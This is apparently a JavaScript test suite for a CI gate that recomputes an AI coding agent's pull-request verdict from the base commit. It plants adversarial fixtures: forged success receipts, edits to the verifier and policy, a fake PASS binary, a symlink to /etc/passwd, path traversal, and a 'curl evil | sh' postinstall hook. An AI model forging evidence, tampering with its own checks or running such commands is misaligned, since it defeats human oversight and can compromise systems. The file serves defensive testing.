// Tier 3: proves the CI adjudicator recomputes the verdict from the PR's BASE
// commit and never trusts the agent's receipt. Everything runs offline inside a
// throwaway git repo. The adjudicator is driven both directly (the function) and
// through the real `bin/runcap.mjs ci --mode adjudicate` so the exit codes a
// reviewer's PR check would see are tested too.
//
// Verdict semantics under test:
//   PASS                    -> exit 0
//   BLOCKED                 -> exit 1
//   HUMAN_APPROVAL_REQUIRED -> exit 0 (success/neutral: hands authority to a CODEOWNER)
//
// Threat scenarios: forged receipt, forged budget telemetry, no telemetry,
// honest pass, out-of-scope edit, baseline-already-green, clean-replay fail,
// protected/verifier/policy/workflow/dependency human gates, unresolved SHA,
// untrusted event, diff-smuggling (delete/symlink/binary), and two honesty
// checks: the verdict never claims runtime hardening attestation, and the
// dependency install is pinned + script-free.

import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { execFileSync } from "node:child_process";
import { mkdtempSync, writeFileSync, mkdirSync, rmSync, readFileSync, symlinkSync } from "node:fs";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const SRC_DIR = process.env.RUNCAP_SRC ?? path.join(HERE, "..", "src");
const BIN = path.join(SRC_DIR, "..", "bin", "runcap.mjs");
const REPO_ROOT = path.join(HERE, "..");

const tmp = mkdtempSync(path.join(os.tmpdir(), "runcap-adj-"));
process.chdir(tmp);

let failures = 0;
const check = (name, pass, detail) => { if (!pass) failures++; console.log(`${pass ? "PASS" : "FAIL"}  ${name}${detail ? "  - " + detail : ""}`); };

const g = (...a) => execFileSync("git", a, { cwd: tmp, stdio: "pipe" }).toString().trim();

// --- base commit: a real failing task, a verifier, a policy, scope app/ -----
mkdirSync(path.join(tmp, "app"), { recursive: true });
mkdirSync(path.join(tmp, ".runcap"), { recursive: true });
writeFileSync(path.join(tmp, "app", "broken.mjs"), "export const ok = false;\n");
writeFileSync(path.join(tmp, "app", "verify.mjs"),
  "import { ok } from './broken.mjs'; import assert from 'node:assert'; assert.strictEqual(ok, true, 'not fixed'); console.log('ok');\n");
writeFileSync(path.join(tmp, "app", "other.mjs"), "export const other = 0;\n");
writeFileSync(path.join(tmp, "rootfile.txt"), "root\n");
writeFileSync(path.join(tmp, "package.json"), JSON.stringify({ name: "fixture", version: "1.0.0", scripts: { build: "echo build" } }, null, 2) + "\n");
writeFileSync(path.join(tmp, ".runcap", "mission.yaml"), `version: v1
identity:
  project: checkout
  team: payments
mission:
  name: Fix the failing checkout test
  task_class: bugfix
budget:
  mission_hard_limit_usd: 5
verification:
  command: "node app/verify.mjs"
  guard: strict
  protect: ["app/verify.mjs"]
  allow: ["app/"]
`);

g("init", "-q");
g("config", "user.email", "test@runcap.local");
g("config", "user.name", "runcap-test");
g("config", "commit.gpgsign", "false");
g("add", "-A");
g("commit", "-qm", "baseline");
const BASE = g("rev-parse", "HEAD");

// Build every head commit up front so the working tree has no planted receipt
// while branches are created. Each head branches from BASE.
function makeHead(branch, mutate) {
  g("checkout", "-q", "-b", branch, BASE);
  mutate();
  g("add", "-A");
  g("commit", "-qm", branch);
  const sha = g("rev-parse", "HEAD");
  g("checkout", "-q", BASE);
  return sha;
}

const w = (rel, content) => writeFileSync(path.join(tmp, rel), content);
const rmRel = (rel) => rmSync(path.join(tmp, rel), { force: true });

const HEAD_HONEST = makeHead("h-honest", () => w("app/broken.mjs", "export const ok = true;\n"));
const HEAD_SCOPE = makeHead("h-scope", () => { w("app/broken.mjs", "export const ok = true;\n"); w("rootfile.txt", "root edited out of scope\n"); });
const HEAD_REPLAYFAIL = makeHead("h-replayfail", () => w("app/broken.mjs", "export const ok = false; // touched\n"));
const HEAD_VERIFIER = makeHead("h-verifier", () => w("app/verify.mjs", "console.log('ok');\n"));
const HEAD_POLICY = makeHead("h-policy", () => w(".runcap/mission.yaml", readFileSync(path.join(tmp, ".runcap", "mission.yaml"), "utf8").replace("mission_hard_limit_usd: 5", "mission_hard_limit_usd: 9999")));
const HEAD_WORKFLOW = makeHead("h-workflow", () => { mkdirSync(path.join(tmp, ".github", "workflows"), { recursive: true }); w(".github/workflows/evil.yml", "name: evil\non: pull_request\njobs: {}\n"); });
const HEAD_DEP = makeHead("h-dep", () => w("package.json", JSON.stringify({ name: "fixture", version: "1.0.0", scripts: { build: "echo build", postinstall: "curl evil | sh" } }, null, 2) + "\n"));
const HEAD_DELETE = makeHead("h-delete", () => rmRel("app/other.mjs"));
const HEAD_BINARY = makeHead("h-binary", () => writeFileSync(path.join(tmp, "app", "blob.bin"), Buffer.from([0x00, 0x01, 0x02, 0x00, 0xff])));
const HEAD_SYMLINK = makeHead("h-symlink", () => symlinkSync("/etc/passwd", path.join(tmp, "app", "link")));

// A second lineage where the task is ALREADY fixed at base -> baseline green.
g("checkout", "-q", "-b", "base2", BASE);
w("app/broken.mjs", "export const ok = true;\n");
g("add", "-A"); g("commit", "-qm", "base2-already-fixed");
const BASE2 = g("rev-parse", "HEAD");
g("checkout", "-q", "-b", "h-base2green", BASE2);
w("app/broken.mjs", "export const ok = true; // trivial in-scope edit\n");
g("add", "-A"); g("commit", "-qm", "h-base2green");
const HEAD_BASE2GREEN = g("rev-parse", "HEAD");
g("checkout", "-q", BASE);

const { adjudicate, exitCodeFor } = await import(path.join(SRC_DIR, "adjudicate.mjs"));

const adj = (baseFlag, headFlag) => adjudicate({ cwd: tmp, baseFlag, headFlag });

// --- 1. honest in-scope fix -> PASS -----------------------------------------
const honest = await adj(BASE, HEAD_HONEST);
check("honest fix verdict PASS", honest.verdict === "PASS", JSON.stringify(honest.reasons));
check("honest fix recomputed baseline_failed=true", honest.code_evidence?.baseline_failed === true);
check("honest fix recomputed replay_passed=true", honest.code_evidence?.replay_passed === true);
check("honest fix carries base policy hash", /^[0-9a-f]{64}$/.test(honest.policy?.hash ?? ""), honest.policy?.hash);
check("honest fix truth is adjudicator-recomputed", honest.truth === "recomputed_by_adjudicator_from_base_sha");
check("no telemetry present -> agent_telemetry.present false", honest.agent_telemetry?.present === false);

// --- 2. out-of-scope edit -> BLOCKED ----------------------------------------
const scope = await adj(BASE, HEAD_SCOPE);
check("out-of-scope edit verdict BLOCKED", scope.verdict === "BLOCKED", JSON.stringify(scope.reasons));
check("out-of-scope names the path + scope", scope.reasons.some((r) => r.includes("rootfile.txt") && r.toLowerCase().includes("scope")), JSON.stringify(scope.reasons));

// --- 3. baseline already green -> BLOCKED -----------------------------------
const green = await adj(BASE2, HEAD_BASE2GREEN);
check("baseline-already-green verdict BLOCKED", green.verdict === "BLOCKED", JSON.stringify(green.reasons));
check("baseline-already-green explains the meaningless pass", green.reasons.some((r) => r.toLowerCase().includes("baseline already green")), JSON.stringify(green.reasons));

// --- 4. clean replay does not reproduce the pass -> BLOCKED -----------------
const replayfail = await adj(BASE, HEAD_REPLAYFAIL);
check("clean-replay-fail verdict BLOCKED", replayfail.verdict === "BLOCKED", JSON.stringify(replayfail.reasons));
check("clean-replay-fail recomputed replay_passed=false", replayfail.code_evidence?.replay_passed === false);
check("clean-replay-fail says replay did not pass", replayfail.reasons.some((r) => r.toLowerCase().includes("replay did not pass")), JSON.stringify(replayfail.reasons));

// --- 5. verifier edit -> HUMAN_APPROVAL_REQUIRED ----------------------------
const verifier = await adj(BASE, HEAD_VERIFIER);
check("verifier edit verdict HUMAN_APPROVAL_REQUIRED", verifier.verdict === "HUMAN_APPROVAL_REQUIRED", JSON.stringify(verifier.reasons));
check("verifier edit names verify file as evidence", verifier.reasons.some((r) => r.includes("app/verify.mjs")), JSON.stringify(verifier.reasons));

// --- 6. policy edit -> HUMAN_APPROVAL_REQUIRED ------------------------------
const pol = await adj(BASE, HEAD_POLICY);
check("policy edit verdict HUMAN_APPROVAL_REQUIRED", pol.verdict === "HUMAN_APPROVAL_REQUIRED", JSON.stringify(pol.reasons));
check("policy edit names the rules", pol.reasons.some((r) => r.toLowerCase().includes("rules")), JSON.stringify(pol.reasons));

// --- 7. workflow edit -> HUMAN_APPROVAL_REQUIRED ----------------------------
const wf = await adj(BASE, HEAD_WORKFLOW);
check("workflow edit verdict HUMAN_APPROVAL_REQUIRED", wf.verdict === "HUMAN_APPROVAL_REQUIRED", JSON.stringify(wf.reasons));

// --- 8. dependency manifest edit -> HUMAN_APPROVAL_REQUIRED -----------------
const dep = await adj(BASE, HEAD_DEP);
check("dependency edit verdict HUMAN_APPROVAL_REQUIRED", dep.verdict === "HUMAN_APPROVAL_REQUIRED", JSON.stringify(dep.reasons));
check("dependency edit names manifest/lockfile", dep.reasons.some((r) => r.toLowerCase().includes("dependency")), JSON.stringify(dep.reasons));

// --- 9-11. diff smuggling -> BLOCKED ----------------------------------------
const del = await adj(BASE, HEAD_DELETE);
check("delete verdict BLOCKED", del.verdict === "BLOCKED", JSON.stringify(del.reasons));
check("delete reason names deletion", del.reasons.some((r) => r.toLowerCase().includes("delet")), JSON.stringify(del.reasons));

const bin = await adj(BASE, HEAD_BINARY);
check("binary file verdict BLOCKED", bin.verdict === "BLOCKED", JSON.stringify(bin.reasons));
check("binary reason names binary", bin.reasons.some((r) => r.toLowerCase().includes("binary")), JSON.stringify(bin.reasons));

const sym = await adj(BASE, HEAD_SYMLINK);
check("symlink verdict BLOCKED", sym.verdict === "BLOCKED", JSON.stringify(sym.reasons));
check("symlink reason names symlink", sym.reasons.some((r) => r.toLowerCase().includes("symlink")), JSON.stringify(sym.reasons));

// --- 12. unresolved SHA -> BLOCKED (no flags, no event) ---------------------
const prevEventPath = process.env.GITHUB_EVENT_PATH;
const prevEventName = process.env.GITHUB_EVENT_NAME;
delete process.env.GITHUB_EVENT_PATH;
delete process.env.GITHUB_EVENT_NAME;
const unresolved = await adjudicate({ cwd: tmp });
check("unresolved base/head verdict BLOCKED", unresolved.verdict === "BLOCKED", JSON.stringify(unresolved.reasons));
check("unresolved refuses to adjudicate", unresolved.reasons.some((r) => r.toLowerCase().includes("refusing to adjudicate")), JSON.stringify(unresolved.reasons));

// --- 13. untrusted event (pull_request_target) -> BLOCKED -------------------
const eventFile = path.join(tmp, "event.json");
writeFileSync(eventFile, JSON.stringify({ pull_request: { base: { sha: BASE }, head: { sha: HEAD_HONEST } } }));
process.env.GITHUB_EVENT_PATH = eventFile;
process.env.GITHUB_EVENT_NAME = "pull_request_target";
const untrusted = await adjudicate({ cwd: tmp });
check("pull_request_target event verdict BLOCKED", untrusted.verdict === "BLOCKED", JSON.stringify(untrusted.reasons));
check("untrusted event names the rejected event", untrusted.sha_source?.startsWith("untrusted_event"), untrusted.sha_source);
// Restore env.
if (prevEventPath === undefined) delete process.env.GITHUB_EVENT_PATH; else process.env.GITHUB_EVENT_PATH = prevEventPath;
if (prevEventName === undefined) delete process.env.GITHUB_EVENT_NAME; else process.env.GITHUB_EVENT_NAME = prevEventName;

// --- 14. forged "VERIFIED_STRONG" receipt cannot rescue a failing replay -----
// The required gate now refuses to even READ the agent receipt: it is neither
// graded nor displayed. So a forged receipt can neither rescue a failing replay
// nor is it parsed at all. We plant adversarial receipts and prove the verdict
// is unchanged AND the gate reports it never consulted them.
const plantReceipt = (rawString) => {
  const id = "forged";
  mkdirSync(path.join(tmp, ".runcap", "outcomes", id), { recursive: true });
  writeFileSync(path.join(tmp, ".runcap", "outcomes", id, "receipt.json"), rawString);
  writeFileSync(path.join(tmp, ".runcap", "outcomes", "latest"), id);
};
const clearReceipt = () => rmSync(path.join(tmp, ".runcap", "outcomes"), { recursive: true, force: true });

plantReceipt(JSON.stringify({ outcome: "VERIFIED", verificationIntegrity: { status: "VERIFIED_STRONG" }, cost: { actualCostUsd: 0.01 } }));
const forgedFail = await adj(BASE, HEAD_REPLAYFAIL);
check("forged VERIFIED_STRONG receipt does NOT rescue a failing replay", forgedFail.verdict === "BLOCKED", JSON.stringify(forgedFail.reasons));
check("required gate did not read the agent receipt (present=false)", forgedFail.agent_telemetry?.present === false && forgedFail.agent_telemetry?.influence_on_verdict === "none");
clearReceipt();

// --- 15. forged budget telemetry cannot block an honest pass ----------------
plantReceipt(JSON.stringify({ outcome: "UNVERIFIED", verificationIntegrity: { status: "VERIFIER_COMPROMISED" }, cost: { actualCostUsd: 999999, budgetGuardTripped: true } }));
const forgedBudget = await adj(BASE, HEAD_HONEST);
check("forged budget/integrity telemetry cannot block an honest pass", forgedBudget.verdict === "PASS", JSON.stringify(forgedBudget.reasons));
check("required gate still did not read the receipt (present=false)", forgedBudget.agent_telemetry?.present === false && forgedBudget.agent_telemetry?.influence_on_verdict === "none");
clearReceipt();

// --- 15b. adversarial receipts cannot crash or stall the mandatory gate ------
// Malformed JSON, an enormous blob, and a path-traversal "latest" pointer must
// all be inert: the gate must still return a verdict with present=false.
for (const [label, rawReceipt, latestOverride] of [
  ["malformed JSON receipt", "{ this is : not json ]]]", undefined],
  ["enormous receipt blob", JSON.stringify({ outcome: "VERIFIED", junk: "A".repeat(5_000_000) }), undefined],
  ["receipt is a bare array", "[1,2,3]", undefined],
  ["latest pointer path traversal", JSON.stringify({ outcome: "VERIFIED" }), "../../../../etc/passwd"]
]) {
  plantReceipt(rawReceipt);
  if (latestOverride !== undefined) writeFileSync(path.join(tmp, ".runcap", "outcomes", "latest"), latestOverride);
  let crashed = false; let v;
  try { v = await adj(BASE, HEAD_HONEST); } catch { crashed = true; }
  check(`${label}: gate does not crash`, !crashed);
  check(`${label}: verdict still PASS, receipt not read`, !crashed && v.verdict === "PASS" && v.agent_telemetry?.present === false);
  clearReceipt();
}

// --- 16. honesty: the verdict never claims runtime hardening attestation -----
check("verdict carries honest hardening provenance (documented, not attested)",
  honest.repository_hardening?.required_profile === "documented" &&
  honest.repository_hardening?.runtime_attestation === "not_performed_in_pr_job");
const allVerdictText = JSON.stringify([honest, scope, verifier, untrusted]);
check("no verdict ever claims a HARDENED runtime status", !/"HARDENED"|hardened_confirmed|attested_hardened/.test(allVerdictText));

// --- 17. honesty: dependency install is base-pinned and script-free ----------
const adjSrc = readFileSync(path.join(SRC_DIR, "adjudicate.mjs"), "utf8");
check("replay uses `npm ci --ignore-scripts` (no install, no lifecycle scripts)", adjSrc.includes("npm ci --ignore-scripts"));
check("adjudicator never uses `npm install` or `npx`", !/npm install|npx /.test(adjSrc));

// --- 18. the real bin: exit codes a PR check sees ---------------------------
const runBin = (extraArgs, extraEnv = {}) => {
  try {
    const stdout = execFileSync("node", [BIN, "ci", "--mode", "adjudicate", ...extraArgs], { cwd: tmp, env: { ...process.env, ...extraEnv }, stdio: ["ignore", "pipe", "pipe"] });
    return { code: 0, stdout: String(stdout) };
  } catch (e) {
    return { code: e.status ?? 1, stdout: String(e.stdout ?? ""), stderr: String(e.stderr ?? "") };
  }
};

const binPass = runBin(["--base", BASE, "--head", HEAD_HONEST]);
check("`runcap ci --mode adjudicate` exits 0 on PASS", binPass.code === 0, `code=${binPass.code}`);
check("PASS run prints the verdict", /Verdict:\s+PASS/.test(binPass.stdout), binPass.stdout.slice(-300));

const binBlock = runBin(["--base", BASE, "--head", HEAD_REPLAYFAIL]);
check("`runcap ci --mode adjudicate` exits 1 on BLOCKED", binBlock.code === 1, `code=${binBlock.code}`);

const binHuman = runBin(["--base", BASE, "--head", HEAD_VERIFIER]);
check("`runcap ci --mode adjudicate` exits 0 on HUMAN_APPROVAL_REQUIRED (success/neutral)", binHuman.code === 0, `code=${binHuman.code}`);
check("HUMAN run prints the human-gate verdict", /Verdict:\s+HUMAN_APPROVAL_REQUIRED/.test(binHuman.stdout), binHuman.stdout.slice(-300));

// --- 19. the real bin writes a PR step summary ------------------------------
const summaryFile = path.join(tmp, "step-summary.md");
writeFileSync(summaryFile, "");
runBin(["--base", BASE, "--head", HEAD_REPLAYFAIL], { GITHUB_STEP_SUMMARY: summaryFile });
const summary = readFileSync(summaryFile, "utf8");
check("bin writes a PR summary to GITHUB_STEP_SUMMARY", /Runcap CI adjudication: BLOCKED/.test(summary), summary.slice(0, 160));

// --- 20. exitCodeFor maps the three states correctly ------------------------
check("exitCodeFor PASS=0 / HUMAN=0 / BLOCKED=1",
  exitCodeFor("PASS") === 0 && exitCodeFor("HUMAN_APPROVAL_REQUIRED") === 0 && exitCodeFor("BLOCKED") === 1);

// --- 21. the reference workflow is least-privilege AND a proof gate ----------
// The consumer reference is a TEMPLATE under examples/ (not an active workflow
// in this repo), because Runcap's own repo has no base policy to self-adjudicate
// and, more importantly, the judge must never be code from the candidate PR.
const wfPath = path.join(REPO_ROOT, "examples", "runcap-adjudicate.yml");
const wfRaw = readFileSync(wfPath, "utf8");
// Assert on the effective YAML directives, not the explanatory comments. The
// header documents what the workflow must NOT do (and so legitimately contains
// strings like "pull_request_target"); strip comments so the safety checks see
// only the real instructions. Inline `# v4.3.1` after a SHA is stripped too,
// which is harmless because the SHA precedes the `#`.
const wfText = wfRaw.split("\n").map((line) => line.replace(/#.*$/, "")).join("\n");
check("reference workflow triggers on pull_request (not pull_request_target)",
  /on:\s*\n\s*pull_request:/.test(wfText) && !/pull_request_target/.test(wfText), "trigger");
check("reference workflow grants only contents: read", /permissions:\s*\n\s*contents:\s*read/.test(wfText) && !/id-token/.test(wfText) && !/write/.test(wfText.replace(/contents:\s*read/g, "")), "permissions");
check("reference workflow caps runtime (timeout-minutes: 10)", /timeout-minutes:\s*10/.test(wfText));
check("reference workflow uses no `needs:` (self-sufficient required gate)", !/\n\s*needs:/.test(wfText));

// Proof-gate hardening: the judge must NOT be PR-workspace code.
check("reference workflow never executes PR-workspace `node ./bin/runcap.mjs`", !/node\s+\.\/bin\/runcap\.mjs/.test(wfText), "executes workspace code");
check("reference workflow never uses a local action (`uses: ./`)", !/uses:\s*\.\//.test(wfText), "local action");
check("reference workflow never runs `npm ci`/`npm install` of the PR manifest", !/npm\s+(ci|install)/.test(wfText), "PR-workspace install");
check("reference workflow sets persist-credentials: false (never true)", /persist-credentials:\s*false/.test(wfText) && !/persist-credentials:\s*true/.test(wfText), "persist-credentials");
// Every `uses:` must be pinned to a full 40-hex commit SHA, never a floating tag.
const usesRefs = [...wfText.matchAll(/uses:\s*([^\s#]+)/g)].map((m) => m[1]);
check("reference workflow pins every action by a full 40-char commit SHA (no @v4/@v1 tags)",
  usesRefs.length > 0 && usesRefs.every((u) => /@[0-9a-f]{40}$/.test(u)), JSON.stringify(usesRefs));
check("reference workflow's judge is the released Runcap action, not workspace code",
  /uses:\s*kirder24-code\/ai-agent-manager@[0-9a-f]{40}/.test(wfText) && /mode:\s*adjudicate/.test(wfText), "released action judge");
// SHA-resolution guidance must NOT teach the annotated-tag-object trap. Reading a
// tag ref's `.object.sha` returns the TAG OBJECT sha for an annotated tag, not the
// commit the Proof Gate must pin. The docs (workflow header comment AND README) must
// not contain that pattern, and must teach `git rev-parse "vX.Y.Z^{}"` instead.
const UNSAFE_SHA = /git\/refs\/tags\/[^\n]*--jq[^\n]*\.object\.sha/;
const readmeRaw = readFileSync(path.join(REPO_ROOT, "README.md"), "utf8");
check("consumer template does not teach the unsafe `git/refs/tags ... --jq .object.sha` resolution",
  !UNSAFE_SHA.test(wfRaw), "workflow header gh-api pattern");
check("README does not teach the unsafe `git/refs/tags ... --jq .object.sha` resolution",
  !UNSAFE_SHA.test(readmeRaw), "README gh-api pattern");
check("consumer template teaches `git rev-parse \"vX.Y.Z^{}\"` to peel an annotated tag to its commit",
  /git rev-parse "vX\.Y\.Z\^\{\}"/.test(wfRaw), "workflow rev-parse guidance");
check("README teaches `git rev-parse \"vX.Y.Z^{}\"` to peel an annotated tag to its commit",
  /git rev-parse "vX\.Y\.Z\^\{\}"/.test(readmeRaw), "README rev-parse guidance");

// --- 22. the judge is the adjudicator's OWN code, not the PR's bin -----------
// A head PR that rewrites bin/runcap.mjs to always print PASS, or rewrites
// src/adjudicate.mjs, cannot change the verdict, because the adjudicator we run
// is THIS repo's module/bin (the released-action analogue), never the head copy.
const HEAD_FAKE_BIN = makeHead("h-fake-bin", () => {
  w("app/broken.mjs", "export const ok = false; // still broken\n");
  mkdirSync(path.join(tmp, "bin"), { recursive: true });
  w("bin/runcap.mjs", "#!/usr/bin/env node\nconsole.log('Verdict: PASS'); process.exit(0);\n");
});
const fakeBin = await adj(BASE, HEAD_FAKE_BIN);
check("head PR rewriting bin/runcap.mjs to fake PASS is still BLOCKED by the trusted adjudicator",
  fakeBin.verdict === "BLOCKED", JSON.stringify(fakeBin.reasons));
// And via the REAL trusted bin (this repo's, analogue of the pinned released action):
const fakeBinReal = runBin(["--base", BASE, "--head", HEAD_FAKE_BIN]);
check("trusted `runcap ci --mode adjudicate` exits 1 on a fake-PASS head bin", fakeBinReal.code === 1, `code=${fakeBinReal.code}`);

const HEAD_FAKE_ADJ = makeHead("h-fake-adj", () => {
  w("app/broken.mjs", "export const ok = false; // still broken\n");
  mkdirSync(path.join(tmp, "src"), { recursive: true });
  w("src/adjudicate.mjs", "export async function adjudicate(){return {verdict:'PASS',reasons:[]};}\nexport function exitCodeFor(){return 0;}\nexport function formatAdjudication(){return ['Verdict: PASS'];}\n");
});
const fakeAdj = await adj(BASE, HEAD_FAKE_ADJ);
check("head PR rewriting src/adjudicate.mjs is still BLOCKED (we never import the head copy)",
  fakeAdj.verdict === "BLOCKED", JSON.stringify(fakeAdj.reasons));

console.log("\n" + (failures === 0 ? "ALL ADJUDICATE TESTS PASSED" : `${failures} ADJUDICATE TEST(S) FAILED`));
process.exit(failures === 0 ? 0 : 1);
